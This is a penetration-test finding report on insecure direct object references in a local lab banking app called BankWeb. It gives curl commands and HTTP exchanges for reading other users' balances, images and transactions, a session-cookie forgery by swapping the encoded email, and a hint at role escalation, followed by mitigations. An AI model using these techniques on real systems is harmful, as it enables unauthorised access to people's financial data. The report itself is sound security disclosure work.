# Issue #18 — Multiple Insecure Direct Object References (IDOR)

| Field         | Details                                               |
|---------------|-------------------------------------------------------|
| **Target**    | BankWeb — `http://localhost:1337`                     |
| **Severity**  | Medium                                                  |
| **CVSS v3.1** | 6.5                                                  |
| **Vector**    | AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N                  |
| **Category**  | Broken Access Control — IDOR                      |

---

## Summary

Four endpoints across the application are vulnerable to Insecure Direct Object Reference (IDOR), allowing any authenticated user to access data belonging to arbitrary other users by manipulating user-controlled identifiers in requests. The affected endpoints cover account balances, profile images, transaction details, and store purchase history — collectively representing the full financial and personal data profile of every user in the application.

Three of the four vectors use a `user` query parameter or URL path segment to identify the target resource, with no server-side ownership check. The fourth — the store purchase history — is exploitable by manipulating the base64-encoded username embedded in the session cookie, replacing it with a different user's email address while reusing the original HMAC segment, which the server accepts without validating the integrity of the full token.

---

## Steps to Reproduce

### Vector A — Account Balance (`/api/User/GetAvailableFunds`)

1. Log in and note the `user` value used in the legitimate balance request.
2. Replace the `user` parameter with the email address of any other registered account:

   ```bash
   curl -s "http://localhost:1337/api/User/GetAvailableFunds?user=[REDACTED-TARGET]" \
     -H "Cookie: SessionId=[REDACTED]"
   ```

3. Observe that the balance for the target account is returned, not the authenticated user's balance.

### Vector B — Profile Image (`/api/User/ProfileImage`)

1. Replace the `user` parameter with any other registered user's email address:

   ```bash
   curl -s "http://localhost:1337/api/User/ProfileImage?user=[REDACTED-TARGET]" \
     -H "Cookie: SessionId=[REDACTED]" --output target.png
   ```

2. Observe that the target user's profile image is returned.

### Vector C — Transaction Details (`/Transaction/Details/{id}`)

1. Note the transaction ID in the URL when viewing one of your own transactions (e.g. `/Transaction/Details/2002`).
2. Decrement the ID to access earlier transactions belonging to other users:

   ```bash
   curl -s "http://localhost:1337/Transaction/Details/1" \
     -H "Cookie: SessionId=[REDACTED]"
   ```

3. Observe that the full transaction details — sender, receiver, amount, date, and reason — for an arbitrary user's transaction are returned.

### Vector D — Store Purchase History (`/Store/History`)

1. Capture your current `SessionId` cookie value and URL-decode it.
2. The decoded cookie follows the structure: `<base64(email)>&<hmac>&<role>`.
3. Base64-encode a different user's email address and substitute it into the first segment, keeping the HMAC and role segments unchanged:

   ```
   Original:  <base64([REDACTED])>&<hmac>&0
   Modified:  <base64([REDACTED-TARGET])>&<hmac>&0
   ```

4. URL-encode the modified cookie and send the request:

   ```bash
   curl -s "http://localhost:1337/Store/History" \
     -H "Cookie: SessionId=[REDACTED-FORGED]"
   ```

5. Observe that the store purchase history for the target user is returned.

---

## Proof of Concept

### Vector A — Account Balance IDOR

**Legitimate request (own account):**

```http
GET /api/User/GetAvailableFunds?user=[REDACTED-OWN] HTTP/1.1
Host: localhost:1337
Cookie: SessionId=[REDACTED]
```

```http
HTTP/1.1 200 OK
{"balance":100}
```

**Cross-account request (target account):**

```http
GET /api/User/GetAvailableFunds?user=[REDACTED-TARGET] HTTP/1.1
Host: localhost:1337
Cookie: SessionId=[REDACTED]
```

```http
HTTP/1.1 200 OK
{"balance":10000}
```

A different account balance is returned without any authorisation error, confirming the server does not verify that the requested `user` matches the session owner.

---

### Vector B — Profile Image IDOR

**Cross-account request:**

```http
GET /api/User/ProfileImage?user=[REDACTED-TARGET] HTTP/1.1
Host: localhost:1337
Cookie: SessionId=[REDACTED]
```

```http
HTTP/1.1 200 OK
Content-Length: 939071
Content-Type: image/jpg

PNG
...
```

The profile image for the target account is returned. Combined with Issue #11 (path traversal on the same endpoint) and Issue #14 (missing authentication), this endpoint represents a convergence of three independent access control failures.

---

### Vector C — Transaction Details IDOR

**Request accessing another user's transaction:**

```http
GET /Transaction/Details/1 HTTP/1.1
Host: localhost:1337
Cookie: SessionId=[REDACTED]
```

```http
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8

...
<dt>SenderId</dt>   <dd>[REDACTED]</dd>
<dt>ReceiverId</dt> <dd>[REDACTED]</dd>
<dt>TransactionDateTime</dt> <dd>05/27/2025 20:17:48</dd>
<dt>Reason</dt>     <dd>[REDACTED]</dd>
<dt>Amount</dt>     <dd>18.70</dd>
...
```

By iterating the integer ID from 1 upward, a complete history of all transactions across all users in the application can be enumerated. Sender identifiers, receiver identifiers, amounts, timestamps, and transaction reasons are all disclosed.

---

### Vector D — Store History via Cookie Manipulation

The session cookie follows a predictable structure. The first segment is simply the base64 encoding of the user's email address, with no binding between the identity claim and the HMAC:

```
Decoded cookie:  [REDACTED-EMAIL]&[REDACTED-HMAC]&0
                 ↑ identity claim  ↑ signature     ↑ role
```

By replacing the email segment with a different user's base64-encoded email while leaving the HMAC unchanged, the server accepts the forged identity:

**Forged request:**

```http
GET /Store/History HTTP/1.1
Host: localhost:1337
Cookie: SessionId=[REDACTED-FORGED]
```

```http
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8

...
<td>[REDACTED-PRODUCT]</td>
<td>[REDACTED-DESCRIPTION]</td>
<td>143</td>
<td>1</td>
<td>[REDACTED-TIMESTAMP]</td>
...
```

The purchase history for the target account is returned in full. This vector also independently confirms that the HMAC in the session cookie does not authenticate the identity claim — the signature and the email are not cryptographically bound to each other, which is a standalone session integrity vulnerability.

> **Note:** All email addresses, HMAC values, product names, and timestamps in the above exchanges have been redacted.

---

## Impact

- **Full cross-user financial data access** — any authenticated user can read the account balance, transaction history, and store purchase history of any other user in the application, including the admin account. In a banking context this constitutes a serious breach of financial privacy.
- **Complete transaction history enumeration** — Vector C exposes all transactions across the entire user base via sequential integer ID iteration, requiring no knowledge of the target's email address. Combined with Issue #15 (user enumeration), a complete financial picture of every account can be assembled.
- **Cookie integrity failure (Vector D)** — the session token does not cryptographically bind the identity claim to the HMAC, meaning the token can be forged without knowledge of the signing key. This is a distinct and serious vulnerability in the session management design that extends beyond the IDOR category.
- **Privilege escalation via role manipulation** — the role field in the session cookie (`&0` for standard users, `&100` for admin) follows the same unprotected pattern as the email segment. An attacker may be able to escalate to admin-level access by modifying this field in the same way as the email, warranting immediate investigation.
- **Compound attack surface** — Vectors A and B affect the same endpoints as Issue #14 (missing authentication), meaning these endpoints have both an authentication failure and an authorisation failure simultaneously. Even if authentication is added, the IDOR must be independently fixed.

---

## Recommended Mitigations

1. **Derive the user identity exclusively from the validated server-side session**, never from a client-supplied parameter. All endpoints that return user-specific data should ignore any `user` query parameter and resolve the identity from the session token:

   ```csharp
   // Replace client-supplied user parameter with session-derived identity
   var username = User.Identity.Name;
   var balance = _userService.GetBalance(username);
   ```

2. **Replace the custom session cookie with a standard, opaque session token.** The current cookie embeds the username and role as readable, manipulable fields. Use a cryptographically random, opaque token that maps to a server-side session record — the identity and role should never be readable from the token itself:

   ```csharp
   // ASP.NET Core standard session — opaque token, server-side state
   builder.Services.AddSession();
   builder.Services.AddAuthentication(CookieAuthenticationDefaults.AuthenticationScheme)
       .AddCookie();
   ```

3. **Enforce ownership checks on resource-by-ID endpoints.** For `/Transaction/Details/{id}`, verify that the authenticated user is either the sender or receiver of the requested transaction before returning any data:

   ```csharp
   var transaction = await _transactionService.GetByIdAsync(id);
   if (transaction.SenderId != username && transaction.ReceiverId != username)
       return Forbid();
   ```

4. **Cryptographically bind all claims in the session token.** If a custom token format is retained, the HMAC must cover the full token payload — including the email and role fields — so that modifying any field invalidates the signature. Preferably, adopt a standard signed token format such as JWT with a strong signing algorithm (e.g. HS256 or RS256).

5. **Conduct a full authorisation audit across all endpoints** using the principle of least privilege as the baseline. Every endpoint that returns or modifies user data should have an explicit ownership or role check, and these checks must be enforced server-side regardless of what the client supplies.